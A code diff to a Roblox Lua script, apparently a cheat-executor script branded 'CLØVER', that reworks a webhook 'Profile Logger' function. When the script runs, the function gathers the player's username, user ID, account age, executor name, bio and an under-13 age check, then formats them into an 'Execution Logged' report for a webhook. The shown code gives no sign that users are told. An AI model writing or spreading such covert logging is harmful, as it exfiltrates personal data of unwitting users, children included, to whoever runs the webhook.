@@ -232,12 +232,6 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
---// 🖤 CLØVER Webhook | Pro Profile Logger
-local hasWebhookFired = false
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
 local function sendWebhook()
     if hasWebhookFired then return end
     hasWebhookFired = true
@@ -253,13 +247,11 @@ local function sendWebhook()
     pcall(function() isUnder13 = player:GetUnder13() end)
     local ageStatus = isUnder13 and "UNDER 13" or "OVER 13"
 
-    -- Fetch description from Roblox profile
-    local description = "N/A"
+    local description = "No bio set."
     local success, data = pcall(function()
-        local result = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..userId))
-        return result
+        return HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/" .. userId))
     end)
-    if success and data and data.description and #data.description > 0 then
+    if success and data and data.description and data.description ~= "" then
         description = data.description
     end
 
@@ -270,37 +262,16 @@ local function sendWebhook()
             icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=48&height=48&format=png"
         },
         title = "💀 CLØVER Execution Logged",
-        description = "**Roblox Bio:**\n" .. (description ~= "N/A" and "> " .. description or "`No bio set.`"),
+        description = "**Roblox Bio:**\n> " .. description ..
+                      "\n\n```txt\nDisplay Name : " .. displayName ..
+                      "\nUsername     : " .. username ..
+                      "\nUser ID      : " .. userId ..
+                      "\nAccount Age  : " .. accountAge .. " days" ..
+                      "\nExecutor     : " .. executor ..
+                      "\nAge Check    : " .. ageStatus .. "\n```",
         color = 0x2f3136,
         thumbnail = {
             url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
-        },
-        fields = {
-            {
-                name = "User ID",
-                value = "```"..userId.."```",
-                inline = true
-            },
-            {
-                name = "Account Age",
-                value = "```"..accountAge.." days```",
-                inline = true
-            },
-            {
-                name = "Executor",
-                value = "```"..executor.."```",
-                inline = true
-            },
-            {
-                name = "Alt Account",
-                value = "```"..isAlt.."```",
-                inline = true
-            },
-            {
-                name = "Age Check",
-                value = "```"..ageStatus.."```",
-                inline = true
-            }
         },
         footer = {
             text = "CLØVER Logger • " .. os.date("%Y/%m/%d %H:%M:%S")
